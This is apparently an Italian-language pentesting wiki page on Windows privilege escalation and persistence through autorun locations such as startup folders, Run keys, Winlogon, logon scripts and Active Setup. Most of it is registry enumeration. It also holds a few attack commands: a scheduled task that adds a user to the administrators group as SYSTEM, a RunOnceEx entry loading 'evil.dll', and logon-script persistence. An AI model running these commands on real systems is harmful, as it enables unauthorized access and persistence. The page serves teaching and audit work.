# Privilege Escalation con Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** può essere usato per eseguire programmi all'**avvio**. Verifica quali binari sono programmati per essere eseguiti all'**avvio** con:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Attività pianificate

Le **attività** possono essere pianificate per essere eseguite con una **determinata frequenza**. Verifica quali binari sono pianificati per l'esecuzione con:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Cartelle

Tutti i binari presenti nelle **cartelle Startup verranno eseguiti all'avvio**. Le cartelle Startup comuni sono quelle elencate di seguito, ma la cartella Startup è indicata nel registro. [Leggi qui per scoprire dove.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **A titolo informativo**: le vulnerabilità di *path traversal* nell'estrazione di archivi (come quella sfruttata in WinRAR prima della versione 7.13 – CVE-2025-8088) possono essere utilizzate per **depositare payload direttamente all'interno di queste cartelle Startup durante la decompressione**, con conseguente esecuzione del codice al successivo logon dell'utente. Per un'analisi approfondita di questa tecnica, vedere:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Nota da qui](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): la voce di Registry **Wow6432Node** indica che è in esecuzione una versione di Windows a 64 bit. Il sistema operativo utilizza questa chiave per mostrare una vista separata di HKEY_LOCAL_MACHINE\SOFTWARE per le applicazioni a 32 bit eseguite su versioni di Windows a 64 bit.

### Runs

**AutoRun comunemente noti** nel Registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Le chiavi del Registry note come **Run** e **RunOnce** sono progettate per eseguire automaticamente i programmi ogni volta che un utente effettua il logon nel sistema. La command line assegnata come valore dati di una chiave è limitata a un massimo di 260 caratteri.<sup>[[2]](#references)</sup>

**Esecuzioni dei servizi** (possono controllare l'avvio automatico dei servizi durante il boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Su Windows Vista e versioni successive, le chiavi del Registry **Run** e **RunOnce** non vengono generate automaticamente. Le voci in queste chiavi possono avviare direttamente i programmi oppure specificarli come dipendenze. Ad esempio, per caricare un file DLL al logon, si potrebbe utilizzare la chiave del Registry **RunOnceEx** insieme a una chiave "Depend". Questo viene dimostrato aggiungendo una voce del Registry per eseguire "C:\temp\evil.dll" durante l'avvio del sistema:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Se puoi scrivere all'interno di una qualsiasi delle chiavi di registro menzionate in **HKLM**, puoi effettuare una privilege escalation quando accede un altro utente.

> [!TIP]
> **Exploit 2**: Se puoi sovrascrivere uno qualsiasi dei binari indicati in una delle chiavi di registro in **HKLM**, puoi modificare quel binario aggiungendo una backdoor quando accede un altro utente e ottenere una privilege escalation.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Percorso di avvio

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

I collegamenti posizionati nella cartella **Startup** attiveranno automaticamente l'avvio di servizi o applicazioni durante il logon dell'utente o il riavvio del sistema. La posizione della cartella **Startup** è definita nel registro sia per l'ambito **Local Machine** sia per quello **Current User**. Ciò significa che qualsiasi collegamento aggiunto a queste posizioni **Startup** specificate assicurerà l'avvio del servizio o del programma collegato dopo il processo di logon o riavvio, rappresentando un metodo semplice per pianificare l'esecuzione automatica dei programmi.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Se puoi sovrascrivere qualsiasi cartella \[User] Shell sotto **HKLM**, potrai indirizzarla a una cartella controllata da te e inserire una backdoor che verrà eseguita ogni volta che un utente effettua il logon nel sistema, effettuando una privilege escalation.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Questo valore del registro per utente può puntare a uno script o a un comando eseguito quando l'utente effettua l'accesso. È principalmente una primitiva di **persistence**, perché viene eseguita solo nel contesto dell'utente interessato, ma vale comunque la pena controllarla durante le attività di post-exploitation e le revisioni degli autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Se puoi scrivere questo valore per l'utente corrente, puoi riattivare l'esecuzione al successivo accesso interattivo senza bisogno dei diritti di amministratore. Se puoi scriverlo nell'hive di un altro utente, potresti ottenere code execution quando quell'utente effettua l'accesso.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Note:

- Preferisci percorsi completi per i file `.bat`, `.cmd`, `.ps1` o altri file launcher già leggibili dall'utente target.
- Questo persiste dopo il logoff/riavvio finché il valore non viene rimosso.
- A differenza di `HKLM\...\Run`, questo **non** concede l'elevazione di privilegi autonomamente; si tratta di persistenza nell'ambito dell'utente.

### Chiavi Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

In genere, la chiave **Userinit** è impostata su **userinit.exe**. Tuttavia, se questa chiave viene modificata, l'eseguibile specificato verrà avviato anche da **Winlogon** al momento dell'accesso dell'utente. Analogamente, la chiave **Shell** dovrebbe puntare a **explorer.exe**, che è la shell predefinita di Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Se puoi sovrascrivere il valore del registro o il binary, sarai in grado di aumentare i privilegi.

### Impostazioni dei criteri

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Controlla la chiave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Modifica del prompt dei comandi in modalità provvisoria

Nel Registro di sistema di Windows, in `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, è presente un valore **`AlternateShell`** impostato per impostazione predefinita su `cmd.exe`. Ciò significa che, quando all'avvio selezioni "Modalità provvisoria con prompt dei comandi" (premendo F8), viene utilizzato `cmd.exe`. Tuttavia, è possibile configurare il computer affinché si avvii automaticamente in questa modalità senza dover premere F8 e selezionarla manualmente.

Passaggi per creare un'opzione di avvio che avvii automaticamente la "Modalità provvisoria con prompt dei comandi":<sup>[[5]](#references)</sup>

1. Modifica gli attributi del file `boot.ini` per rimuovere i flag di sola lettura, di sistema e nascosto: `attrib c:\boot.ini -r -s -h`
2. Apri `boot.ini` per modificarlo.
3. Inserisci una riga come: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Salva le modifiche in `boot.ini`.
5. Riapplica gli attributi originali del file: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** La modifica della chiave di Registro **AlternateShell** consente di configurare una shell dei comandi personalizzata, potenzialmente per ottenere accesso non autorizzato.
- **Exploit 2 (permessi di scrittura su PATH):** Disporre di permessi di scrittura su qualsiasi parte della variabile di sistema **PATH**, in particolare prima di `C:\Windows\system32`, consente di eseguire un `cmd.exe` personalizzato, che potrebbe fungere da backdoor se il sistema viene avviato in modalità provvisoria.
- **Exploit 3 (permessi di scrittura su PATH e boot.ini):** Avere accesso in scrittura a `boot.ini` consente l'avvio automatico in modalità provvisoria, facilitando l'accesso non autorizzato al successivo riavvio.

Per verificare l'impostazione corrente di **AlternateShell**, usa questi comandi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Componente installato

Active Setup è una funzionalità di Windows che **si avvia prima che l'ambiente desktop sia completamente caricato**. Dà priorità all'esecuzione di determinati comandi, che devono essere completati prima che il logon dell'utente prosegua. Questo processo avviene persino prima dell'attivazione di altre voci di avvio, come quelle nelle sezioni del registro Run o RunOnce.

Active Setup è gestito tramite le seguenti chiavi di registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

All'interno di queste chiavi sono presenti diverse sottochiavi, ognuna corrispondente a un componente specifico. I valori delle chiavi di particolare interesse includono:

- **IsInstalled:**
- `0` indica che il comando del componente non verrà eseguito.
- `1` indica che il comando verrà eseguito una volta per ogni utente, comportamento predefinito se il valore `IsInstalled` è assente.
- **StubPath:** definisce il comando che verrà eseguito da Active Setup. Può essere qualsiasi riga di comando valida, come l'avvio di `notepad`.

**Informazioni di sicurezza:**

- La modifica o la scrittura di una chiave in cui **`IsInstalled`** è impostato su `"1"` con uno specifico **`StubPath`** può portare all'esecuzione non autorizzata di comandi, con il potenziale di ottenere privilege escalation.
- La modifica del file binario referenziato da qualsiasi valore **`StubPath`** potrebbe inoltre consentire una privilege escalation, se si dispone di autorizzazioni sufficienti.

Per esaminare le configurazioni **`StubPath`** nei componenti di Active Setup, è possibile utilizzare questi comandi:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Panoramica dei Browser Helper Objects (BHO)

I Browser Helper Objects (BHO) sono moduli DLL che aggiungono funzionalità extra a Internet Explorer di Microsoft. Vengono caricati in Internet Explorer e Windows Explorer a ogni avvio. Tuttavia, la loro esecuzione può essere bloccata impostando la chiave **NoExplorer** su 1, impedendo il loro caricamento nelle istanze di Windows Explorer.<sup>[[1]](#references)</sup>

I BHO sono compatibili con Windows 10 tramite Internet Explorer 11, ma non sono supportati in Microsoft Edge, il browser predefinito nelle versioni più recenti di Windows.

Per esaminare i BHO registrati su un sistema, è possibile controllare le seguenti chiavi del registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Ogni BHO è rappresentato dal proprio **CLSID** nel registro, che funge da identificatore univoco. Informazioni dettagliate su ciascun CLSID sono disponibili in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Per interrogare i BHO nel registro, è possibile utilizzare questi comandi:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Estensioni di Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Nota che il registro conterrà una nuova voce di registro per ogni dll, rappresentata dal **CLSID**. Puoi trovare le informazioni sul CLSID in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Driver dei font

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Comando Open

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opzioni di esecuzione dei file immagine
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Tieni presente che tutti i percorsi in cui puoi trovare gli autorun sono **già ricercati da**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Tuttavia, per un **elenco più completo dei** file eseguiti automaticamente, puoi usare [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)di systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Altro

**Trova altri Autoruns, come le chiavi di registro, in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## Riferimenti

- [1] [Meccanismi comuni di persistenza del malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Categorie di avvio automatico (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Come posso aggiungere un'opzione di avvio che avvii una shell alternativa?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Riepilogo Metasploit del 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
